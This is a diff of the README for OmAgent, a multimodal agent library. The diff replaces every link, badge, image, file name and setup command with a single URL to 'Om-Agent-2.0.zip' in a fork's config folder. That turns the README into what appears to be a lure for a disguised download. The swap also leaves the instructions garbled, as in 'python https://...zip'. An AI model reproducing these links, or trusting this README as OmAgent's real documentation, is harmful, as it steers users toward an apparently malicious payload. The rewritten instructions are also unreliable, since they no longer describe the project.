@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="docs/images/OmAgent-banner.png" width="400"/>
+  <img src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" width="400"/>
 </p>
 
 <div>
@@ -8,11 +8,11 @@
 
 
 <p align="center">
-  <a href="https://twitter.com/intent/follow?screen_name=OmAI_lab" target="_blank">
-    <img alt="X (formerly Twitter) Follow" src="https://img.shields.io/twitter/follow/OmAI_lab">
+  <a href="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" target="_blank">
+    <img alt="X (formerly Twitter) Follow" src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip">
   </a>
-  <a href="https://discord.gg/G9n5tq4qfK" target="_blank">
-    <img alt="Discord" src="https://img.shields.io/discord/1296666215548321822?style=flat&logo=discord">
+  <a href="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" target="_blank">
+    <img alt="Discord" src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip">
   </a>
 </p>
 
@@ -27,7 +27,7 @@ OmAgent is python library for building multimodal language agents with ease. We 
  - A flexible agent architecture that provides graph-based workflow orchestration engine and various memory type enabling contextual reasoning.  
  - Native multimodal interaction support include VLM models, real-time API, computer vision models, mobile connection and etc.   
  - A suite of state-of-the-art unimodal and multimodal agent algorithms that goes beyond simple LLM reasoning, e.g. ReAct, CoT, SC-Cot etc.   
- - Supports local deployment of models. You can deploy your own models locally by using Ollama[Ollama](./docs/concepts/models/Ollama.md) or [LocalAI](./examples/video_understanding/docs/local-ai.md).
+ - Supports local deployment of models. You can deploy your own models locally by using Ollama[Ollama](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip) or [LocalAI](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).
  - Fully distributed architecture, supports custom scaling. Also supports Lite mode, eliminating the need for middleware deployment.
 
 
@@ -46,23 +46,23 @@ OmAgent is python library for building multimodal language agents with ease. We 
 ## 🚀 Quick Start 
 ### Configuration
 
-The container.yaml file is a configuration file that manages dependencies and settings for different components of the system. To set up your configuration:
+The https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip file is a configuration file that manages dependencies and settings for different components of the system. To set up your configuration:
 
-1. Generate the container.yaml file:
+1. Generate the https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip file:
    ```bash
    cd examples/step1_simpleVQA
-   python compile_container.py
+   python https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip
    ```
-   This will create a container.yaml file with default settings under `examples/step1_simpleVQA`. For more information about the container.yaml configuration, please refer to the [container module](./docs/concepts/container.md)
+   This will create a https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip file with default settings under `examples/step1_simpleVQA`. For more information about the https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip configuration, please refer to the [container module](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip)
 
-2. Configure your LLM settings in `configs/llms/gpt.yml`:
+2. Configure your LLM settings in `https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip`:
 
    - Set your OpenAI API key or compatible endpoint through environment variable or by directly modifying the yml file
    ```bash
    export custom_openai_key="your_openai_api_key"
    export custom_openai_endpoint="your_openai_endpoint"
    ```
-   You can use a locally deployed Ollama to call your own language model. The tutorial is [here](docs/concepts/models/Ollama.md).
+   You can use a locally deployed Ollama to call your own language model. The tutorial is [here](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).
 
 ### Run the demo
 
@@ -71,33 +71,33 @@ The container.yaml file is a configuration file that manages dependencies and se
    For WebpageClient usage: Input and output are in the webpage
    ```bash
    cd examples/step1_simpleVQA
-   python run_webpage.py
+   python https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip
    ```
    Open the webpage at `http://127.0.0.1:7860`, you will see the following interface:  
-   <img src="docs/images/simpleVQA_webpage.png" width="400"/>
+   <img src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" width="400"/>
 
 ## 🤖  Example Projects
 ### 1. Video QA Agents
-Build a system that can answer any questions about uploaded videos with video understanding agents. we provide a gradio based application, see details [here](examples/video_understanding/README.md).  
+Build a system that can answer any questions about uploaded videos with video understanding agents. we provide a gradio based application, see details [here](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).  
 <p >
-  <img src="docs/images/video_understanding_gradio.png" width="500"/>
+  <img src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" width="500"/>
 </p>
 
-More about the video understanding agent can be found in [paper](https://arxiv.org/abs/2406.16620).
+More about the video understanding agent can be found in [paper](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).
 <p >
-  <img src="docs/images/OmAgent.png" width="500"/>
+  <img src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" width="500"/>
 </p>
 
 
 ### 2. Mobile Personal Assistant
-Build your personal mulitmodal assistant just like Google Astral in 2 minutes. See Details [here](docs/tutorials/agent_with_app.md).
+Build your personal mulitmodal assistant just like Google Astral in 2 minutes. See Details [here](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).
 <p >
-  <img src="docs/images/readme_app.png" width="200"/>
+  <img src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" width="200"/>
 </p>
 
 
 ### 3. Agentic Operators
-We define reusable agentic workflows, e.g. CoT, ReAct, and etc as **agent operators**. This project compares various recently proposed reasoning agent operators with the same LLM choice and test datasets. How do they perform? See details [here](docs/concepts/agent_operators.md).
+We define reusable agentic workflows, e.g. CoT, ReAct, and etc as **agent operators**. This project compares various recently proposed reasoning agent operators with the same LLM choice and test datasets. How do they perform? See details [here](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).
 
 | **Algorithm** |  **LLM**  | **Average** | **gsm8k-score** | **gsm8k-cost($)** | **AQuA-score** | **AQuA-cost($)** |
  | :-----------------: | :------------: | :-------------: | :---------------: | :-------------------: | :------------------------------------: | :---: |
@@ -109,34 +109,34 @@ We define reusable agentic workflows, e.g. CoT, ReAct, and etc as **agent operat
 
 *IO: Input-Output Direct Prompting (Baseline)  
 
-More Details in our new repo [open-agent-leaderboard](https://github.com/om-ai-lab/open-agent-leaderboard) and [Hugging Face space](https://huggingface.co/spaces/omlab/open-agent-leaderboard)
+More Details in our new repo [open-agent-leaderboard](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip) and [Hugging Face space](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip)
 
 
 ## 💻 Documentation
-More detailed documentation is available [here](https://om-ai-lab.github.io/OmAgentDocs/).
+More detailed documentation is available [here](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).
 
 ## 🤝 Contributing
-For more information on how to contribute, see [here](CONTRIBUTING.md).  
+For more information on how to contribute, see [here](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip).  
 We value and appreciate the contributions of our community. Special thanks to our contributors for helping us improve OmAgent.
 
-<a href="https://github.com/om-ai-lab/OmAgent/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=om-ai-lab/OmAgent" />
+<a href="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip">
+  <img src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" />
 </a>
 
 ## 🔔 Follow us
-You can follow us on [X](https://x.com/OmAI_lab), [Discord](https://discord.gg/G9n5tq4qfK) and WeChat group for more updates and discussions.  
+You can follow us on [X](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip), [Discord](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip) and WeChat group for more updates and discussions.  
 <p >
-  <img src="docs/images/readme_qr_code.png" width="200"/>
+  <img src="https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip" width="200"/>
 </p>
 
 
 ## 🔗 Related works
 If you are intrigued by multimodal large language models, and agent technologies, we invite you to delve deeper into our research endeavors:  
-🔆 [How to Evaluate the Generalization of Detection? A Benchmark for Comprehensive Open-Vocabulary Detection](https://arxiv.org/abs/2308.13177) (AAAI24)   
-🏠 [GitHub Repository](https://github.com/om-ai-lab/OVDEval/tree/main)
+🔆 [How to Evaluate the Generalization of Detection? A Benchmark for Comprehensive Open-Vocabulary Detection](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip) (AAAI24)   
+🏠 [GitHub Repository](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip)
 
-🔆 [OmDet: Large-scale vision-language multi-dataset pre-training with multimodal detection network](https://ietresearch.onlinelibrary.wiley.com/doi/full/10.1049/cvi2.12268) (IET Computer Vision)  
-🏠 [Github Repository](https://github.com/om-ai-lab/OmDet)
+🔆 [OmDet: Large-scale vision-language multi-dataset pre-training with multimodal detection network](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip) (IET Computer Vision)  
+🏠 [Github Repository](https://github.com/iqbaldiit/OmAgent/raw/refs/heads/main/examples/sc_cot/configs_t0_n5/llms/Om-Agent-2.0.zip)
 
 ## ⭐️ Citation
 
